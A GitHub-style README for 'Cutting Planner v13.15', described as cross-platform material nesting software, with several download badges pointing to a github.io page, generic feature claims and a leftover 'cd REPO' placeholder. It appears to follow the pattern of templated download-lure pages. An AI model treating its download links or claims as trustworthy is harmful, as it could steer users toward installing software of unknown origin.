# Cutting Planner v13.15 - Material Optimization Software 2026

> **Cutting Planner 13.15 is a material optimization tool for desktop and web that streamlines nesting, produces production-ready exports, and keeps cutting workflows organized under version 13.15.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform%20desktop%20%26%20web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v13.15-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kellyben90/cutting-planner-13-material-hub?style=flat-square)](https://github.com/kellyben90/cutting-planner-13-material-hub)

---

<p align="center">
  <a href="https://kellyben90.github.io/cutting-planner-13-material-hub/">
    <img src="https://img.shields.io/badge/Download-Cutting%20Planner%20Latest-brightgreen?style=for-the-badge" alt="Download Cutting Planner">
  </a>
</p>

> **[Direct Download - Cutting Planner v13.15](https://kellyben90.github.io/cutting-planner-13-material-hub/)**

---

[Download Latest Build](https://kellyben90.github.io/cutting-planner-13-material-hub/)

---

## What Cutting Planner Does

When material optimization hinges on layout quality, reliable file output, and throughput at the same time, Cutting Planner is built for that balance. Nesting-oriented planning is paired with workflow controls, so a team can organize cutting jobs, monitor how material is consumed, and get from plan to export without extra manual handoffs.

Because the tool runs both on the desktop and in the browser, it fits mixed environments where planning behavior has to stay consistent across Windows and Linux machines. Batch handling, leftover-material tracking, and activity logging make it a good match for production settings that depend on repeatable decisions and a clear operational record.

---

## Capabilities

- Nesting driven by constraints, for structured layout planning of material
- Adaptive constraint propagation that sharpens placement decisions
- Several optimization algorithms to suit different job profiles
- Remnant management for keeping usable offcuts visible and tracked
- A live yield dashboard for reviewing progress and efficiency at a glance
- Batch processing that runs multiple jobs one after another
- DXF and G-code export for fabrication pipelines downstream
- Audit trail logging that leaves a reviewable history of activity
- Offline activation for sites with restricted connectivity
- A multilingual interface that widens operator accessibility

---

## Getting Started

1. Grab the newest build from the project release page.
2. Unpack the package or run the installer that matches your platform.
3. Launch the desktop application, or open the web deployment in a browser.
4. For a local workspace, start the main application entry point once setup is complete.

Developers who want to clone the repository for development or packaging can run:

    git clone https://github.com/kellyben90/cutting-planner-13-material-hub.git
    cd REPO

After that, use the startup steps specific to your environment.

---

## How to Use It

Begin by loading a material profile, setting the cut constraints, and adding the parts or jobs to be optimized. Then run a nesting pass, inspect the result on the yield dashboard, and switch planning strategies whenever a layout needs to be improved.

A common sequence looks like this:

1. Import the job set.
2. Set stock dimensions and constraints.
3. Run the optimization.
4. Check remnant usage and yield.
5. Export DXF or G-code for production.
6. Store the audit trail for later review.

When working in batch, queue up several jobs and run them under the same rules so planning stays consistent from one run to the next.

---

## Configuration

Settings are generally handled either through the application interface or through local configuration files that appear on first launch.

Example structure:

    {
      "language": "en",
      "activation": "offline",
      "export": {
        "format": "dxf",
        "include_gcode": true
      },
      "workflow": {
        "batch_processing": true,
        "audit_logging": true
      }
    }

Tune the language, export targets, and workflow behavior so they line up with your production process.

---

## Requirements

- Windows or Linux for desktop use
- A current web browser for web access
- Sufficient storage for job data, exports, and logs
- Runtime support suited to the deployment you choose
- Administrative rights may be required to install the software or complete offline activation

---

## FAQ

**Where can I find the newest release?**  
The download link above points to the current build for version 13.15.

**Does it work on multiple platforms?**  
The product profile lists cross-platform desktop and web support, and the environment scope covers Windows and Linux.

**Where does the app keep its settings?**  
Depending on your deployment, settings live in the local configuration area or are managed from inside the UI.

**What should I check if an export looks wrong?**  
Review the nesting rules, material dimensions, and the optimization mode you selected, then rerun the job.

**Can planning activity be tracked?**  
Yes. Audit trail logging is part of the tool and records activity during planning and export.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
